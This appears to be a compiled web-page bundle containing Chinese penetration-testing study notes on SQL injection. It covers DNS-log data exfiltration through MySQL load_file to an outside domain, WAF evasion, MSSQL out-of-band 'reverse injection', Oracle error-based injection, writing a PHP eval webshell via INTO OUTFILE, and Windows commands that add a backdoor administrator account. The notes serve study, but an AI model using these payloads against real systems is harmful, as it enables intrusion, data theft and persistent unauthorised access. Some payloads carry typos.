"),v("p",[_._v("针对不同条件是要用不同的方法\n1、知道表名\n2、注入点的字段数要大于你想要查询的字段数")]),_._v(" "),v("p",[_._v("一个网站不可能只存在一个漏洞，只要是在同一个网站就肯定会有相似的漏洞")]),_._v(" "),v("h2",{attrs:{id:"mysql注入-dns注入"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#mysql注入-dns注入"}},[_._v("#")]),_._v(" MySQL注入-DNS注入")]),_._v(" "),v("p",[_._v("大部分电脑在工作时会产生日志，而DNS注入的原理就是利用这个日志")]),_._v(" "),v("p",[_._v("所以我们要满足以下条件")]),_._v(" "),v("ul",[v("li",[_._v("我们要MySQL能访问我们指定的东西")]),_._v(" "),v("li",[_._v("我们要看到日志")])]),_._v(" "),v("p",[_._v("DNSLOG的使用场景也是在不知道库名的情况下，让目标机器发起一个网络请求，比如")]),_._v(" "),v("p",[v("code",[_._v("select database()")]),_._v(".baidu.com")]),_._v(" "),v("p",[v("code",[_._v("库名.baodu.com")])]),_._v(" "),v("p",[v("code",[_._v("load_file")]),_._v("可以读取文件，读取本地和远程的文件")]),_._v(" "),v("p",[_._v("用法是"),v("code",[_._v("select load_file('绝对路径'):")])]),_._v(" "),v("p",[_._v("load_file()在MySQL中是默认不开启的，通常需要通过特殊的配置")]),_._v(" "),v("p",[_._v("需要在MySQL的配置文件里加一句"),v("code",[_._v("secure_flie_priv=")])]),_._v(" "),v("p",[_._v("读取远程文件的方法是利用Windows上的服务(文件共享服务)，“网上邻居”、共享文件")]),_._v(" "),v("p",[_._v("这里要引出一个叫做UNC路径的概念")]),_._v(" "),v("p",[_._v("UNC路径 通用命名规则，也称为通用命名规范、通用命名约定")]),_._v(" "),v("p",[_._v("UNC路径就是类似于\\softer这样形式的网络路径。它符合\\servername\\sharename格式，其中servername是服务器名，sharename是共享资源名称。")]),_._v(" "),v("p",[_._v("目录或文件的UNC名称可以包括共享名称下的目标路径，格式为：")]),_._v(" "),v("p",[v("code",[_._v("\\\\servername\\sharename\\directory\\filename")])]),_._v(" "),v("p",[_._v("例如softer计算机的名为it168的共享文件夹，用UNC表示就是\\softer\\it168")]),_._v(" "),v("p",[_._v("不过UNC路径也可以这样写//servername/sharename [推荐这样写]")]),_._v(" "),v("p",[_._v("看到日志的方法是使用"),v("a",{attrs:{href:"http://dnslog.cn/",target:"_blank",rel:"noopener noreferrer"}},[_._v("Dnslog平台"),v("OutboundLink")],1)]),_._v(" "),v("p",[v("code",[_._v("select load_file(concat('//', database(), '.DNSLOG上请求的域名'))")])]),_._v(" "),v("p",[_._v("利用这个方法去查询表名")]),_._v(" "),v("p",[v("code",[_._v("select load_file(concat('//', (select table_name from infromation_schema.tables where table_schema=database() limit 0, 1),'.dnslog域名'));")])]),_._v(" "),v("p",[_._v("在实际网站进行sql注入时，会遇见一个东西")]),_._v(" "),v("p",[_._v("网站防火墙 => Waf => 安全狗")]),_._v(" "),v("p",[_._v("在大部分情况下 Waf => 商业非定制性Waf => 通用Waf")]),_._v(" "),v("p",[_._v("也就是说大部分情况下网站的waf都是可以在网上直接下载到的，都有一个非常相似的模板和规则")]),_._v(" "),v("p",[_._v("因为业务的体验性是最重要的所以waf都是有弹性的，因为有弹性才有绕过")]),_._v(" "),v("p",[_._v("通用型waf中还有一个东西。")]),_._v(" "),v("p",[_._v("index3.php/.txt => 特殊写法 Apache有一个规则，遇见某个文件，找不到的就会执行前一个文件，从右往左")]),_._v(" "),v("p",[_._v("sqlmap没法跑dns")]),_._v(" "),v("p",[_._v("当你可以DNS注入的时候，代表着你可以写文件load_flie()")]),_._v(" "),v("p",[_._v("select 1 into outfile "),v("code",[_._v("'c:/web/1.txt'")]),_._v("这里必须是绝对路径")]),_._v(" "),v("p",[_._v("所以这个时候我们就可以借用以下PHP的一句话木马了")]),_._v(" "),v("p",[v("code",[_._v("<?php @eval($_REQUESET[9])?>")])]),_._v(" "),v("p",[_._v("eval()函数， 将获取到的内容当作代码执行@是防止报错的")]),_._v(" "),v("h2",{attrs:{id:"mysql注入-反弹注入"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#mysql注入-反弹注入"}},[_._v("#")]),_._v(" MySQL注入——反弹注入")]),_._v(" "),v("p",[_._v("反弹注入 => 不需要修改配置就能用(实现将我查询到的数据，插入到其他的数据库)")]),_._v(" "),v("p",[v("code",[_._v("select *from admin")]),_._v("给插入到其他数据库里")]),_._v(" "),v("p",[_._v("目标数据库是A，你在公网服务器上建立了一个B数据库")]),_._v(" "),v("p",[_._v("将A得到的数据插入到B数据库里面")]),_._v(" "),v("p",[_._v("条件：")]),_._v(" "),v("ul",[v("li",[_._v("MSSQL数据库")]),_._v(" "),v("li",[_._v("有公网IP MSSQL数据库")])]),_._v(" "),v("p",[_._v("堆叠注入：再注入的时候可以用;(;代表语句结束)"),v("code",[_._v("<?php $a=1;$b=2;?>")])]),_._v(" "),v("p",[_._v("插入东西，有标准、要求字段数类型相同")]),_._v(" "),v("p",[_._v("反弹注入的条件：")]),_._v(" "),v("ul",[v("li",[_._v("1、有堆叠注入(MSSQL)")]),_._v(" "),v("li",[_._v("2、目标有外网环境，")])]),_._v(" "),v("p",[_._v("反弹注入的使用场景：")]),_._v(" "),v("blockquote",[v("p",[_._v("明明是sql的注入点却无法进行注入，注入工具的")])]),_._v(" "),v("h2",{attrs:{id:"oracle注入-报错注入"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#oracle注入-报错注入"}},[_._v("#")]),_._v(" Oracle注入——报错注入")]),_._v(" "),v("p",[_._v("Oracle——最黑心的数据库")]),_._v(" "),v("p",[_._v("Oracle一般用于银行、证券部门他的能力确实比其他数据库更加强大。但现在大公司有逐渐趋于MySQL数据库的趋势。")]),_._v(" "),v("p",[_._v("未来有可能会以MySQL为主")]),_._v(" "),v("p",[_._v("Oracle里还有一个特殊的函数udal它是一个实表，但是它又像一个虚表，因为它里面只有一个x数据，更多的作用是用于满足语法需求")]),_._v(" "),v("div",{staticClass:"language- extra-class"},[v("pre",{pre:!0,attrs:{class:"language-text"}},[v("code",[_._v("select * from all_tables 查询出所有的表\nselect * from user_tables 查询出当前用户的表\n\nselect * from all_tab_columns 查询出所有字段\nselect * from user_tab_columns 查询出所有的字段\n\nselect * from v$version 查版本\nrownum<2 (限制查询返回的总行数为一条)\n\nCTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1))\n去查询关于主题的对应关键词，然后因为查询失败(应该是这个用户没有创建和查询的权限，默认情况没有创建，爆出为查询到的错误从而爆出查询的内容)\n\nand 1=ctxsys.drithsx.sn(1,(select banner from sys.v$version where rownum=1))-- 查询数据库版本\n")])])]),v("h2",{attrs:{id:"使用sql获取webshell"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#使用sql获取webshell"}},[_._v("#")]),_._v(" 使用SQL获取Webshell")]),_._v(" "),v("p",[_._v("Mysql导出函数：将数据库里的内容导出")]),_._v(" "),v("div",{staticClass:"language-sql extra-class"},[v("pre",{pre:!0,attrs:{class:"language-sql"}},[v("code",[v("span",{pre:!0,attrs:{class:"token keyword"}},[_._v("into")]),_._v(" "),v("span",{pre:!0,attrs:{class:"token keyword"}},[_._v("outfile")]),_._v("\n\n"),v("span",{pre:!0,attrs:{class:"token keyword"}},[_._v("into")]),_._v(" "),v("span",{pre:!0,attrs:{class:"token keyword"}},[_._v("dumpfile")]),_._v(" "),v("span",{pre:!0,attrs:{class:"token comment"}},[_._v("# 可以写16进制写入")]),_._v("\n")])])]),v("p",[_._v("当知道绝对路径的时候，且可以导出权限开启的时候就可以拿到webshell")]),_._v(" "),v("p",[v("code",[_._v("id=1 union select 1,'<?php eval($_REQUEST[8])?>' into outfile 'c:/phpstudy/www/125.php'")])]),_._v(" "),v("p",[_._v("关键就在于如何获取这个绝对路径。简单的网站可以用这个方法：乱输入一些参数进去使其数据库报错，就会出现绝对路径。不过真实情况下基本不会遇见")]),_._v(" "),v("p",[_._v("当获取到webshell以后的第一件事情就是查看当前用户的权限")]),_._v(" "),v("p",[_._v("一共有两个步骤")]),_._v(" "),v("ul",[v("li",[_._v("先"),v("code",[_._v("whoami")]),_._v("查看当前用户")]),_._v(" "),v("li",[_._v("再"),v("code",[_._v("net localgroup administrators")])])]),_._v(" "),v("p",[_._v("第二个步骤的作用是查看当前服务器内的管理员名单，如果里面没有whoami的用户。那就证明你获取的权限依旧不是最高，需要进行提权。")]),_._v(" "),v("p",[v("a",{attrs:{href:"https://i.hacking8.com/tiquan",target:"_blank",rel:"noopener noreferrer"}},[_._v("提权辅助网站"),v("OutboundLink")],1)]),_._v(" "),v("p",[_._v("使用这个网站可以进行辅助提权，下面介绍一些Windows端的命令")]),_._v(" "),v("div",{staticClass:"language-windows extra-class"},[v("pre",{pre:!0,attrs:{class:"language-text"}},[v("code",[_._v("netstat -ano # 查看当前开放的所有端口\n\ntasklist\t # 查看当前所有进程\n\nsysteminfo   # 查看当前系统的所有信息\n\nnet user name p@ssw0rd /all # 创建账号\n\nnet localgroup administrators name /add # 将某个用户添加到管理员权限\n")])])])],1)}),[],!1,null,null,null);v.default=a.exports}}]);